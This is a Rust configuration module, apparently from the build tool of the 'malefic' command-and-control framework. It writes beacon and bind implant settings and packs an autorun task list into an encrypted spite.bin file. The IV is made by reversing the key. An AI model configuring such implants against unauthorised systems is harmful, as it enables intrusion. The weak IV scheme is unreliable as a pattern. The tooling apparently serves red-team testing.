use std::io::Write;
use std::path::Path;

use config_helper::update_helper_toml;
use config_winkit::update_winkit_toml;
use config_modules::update_module_toml;
use config_malefic::update_beacon_toml;
use config_core::{update_core_toml, update_core_config};
use config_prelude::parse_yaml;
use config_metadata::update_resources;
use config_proto::update_proto_toml;
use malefic_proto::compress::compress;
use malefic_proto::crypto::new_cryptor;
use malefic_proto::parser::encode;
use malefic_proto::proto::implantpb::Spites;
use crate::config::config_config_toml::update_config_toml;
use crate::{Implant, Version};

mod config_helper;
mod config_modules;
mod config_winkit;
mod config_malefic;
mod config_prelude;
mod config_core;
mod config_metadata;
mod config_proto;
mod config_pulse;
mod config_config_toml;

pub fn update_pulse_config(
    source: bool,
) -> anyhow::Result<()> {
    println!("Updating pulse configuration...");
    config_pulse::update_pulse_toml(source);
    println!("Updating pulse configuration successfully.");
    Ok(())
}

pub fn update_common_config(
    implant: &mut Implant,
    version: &Version,
    source: bool,
) {
    println!("Updating version and build-type ...");
    update_helper_toml(version, source);
    update_winkit_toml(&implant.implants, version, source);
}

fn update_config(
    r#mod: &str,
    implant: &mut Implant,
) -> anyhow::Result<()> {
    implant.implants.r#mod = r#mod.to_string();
    update_core_config(&implant.basic);
    update_resources(&implant.metadata);
    update_proto_toml(&implant.basic);
    update_core_toml(&implant.basic, &implant.implants);
    update_beacon_toml(&implant.implants);
    update_module_toml(&implant.implants.modules);
    Ok(())
}

pub fn update_beacon_config(
    implant: &mut Implant,
) -> anyhow::Result<()> {
    println!("Updating beacon configuration...");
    update_config("beacon", implant)?;
    println!("Updating beacon configuration successfully.");
    update_config_toml();
    Ok(())
}

pub fn update_bind_config(
    implant: &mut Implant,
) -> anyhow::Result<()> {
    println!("Updating bind configuration...");
    update_config("bind", implant)?;
    println!("Updating bind configuration successfully.");
    update_config_toml();
    Ok(())
}

pub fn update_prelude_config(
    yaml_path: &str,
    resources: &str,
    key: &str
) -> anyhow::Result<()> {
    println!("Updating prelude configuration...");
    let base_filepath = Path::new(resources);
    let autorun_yaml = std::fs::read_to_string(yaml_path)?;
    let spites = parse_yaml(&autorun_yaml);
    let data = encode(Spites { spites })?;
    let compressed = compress(&data)?;
    let iv = key.as_bytes().to_vec().iter().rev().cloned().collect();
    let mut cryptor = new_cryptor(key.as_bytes().to_vec(), iv);
    let encrypted = cryptor.encrypt(compressed)?;
    let spite_path = base_filepath.join("spite.bin");
    let mut file = std::fs::File::create(spite_path.clone())?;
    file.write_all(&encrypted)?;
    println!("Data successfully written to {:?}", spite_path);
    update_config_toml();
    Ok(())
}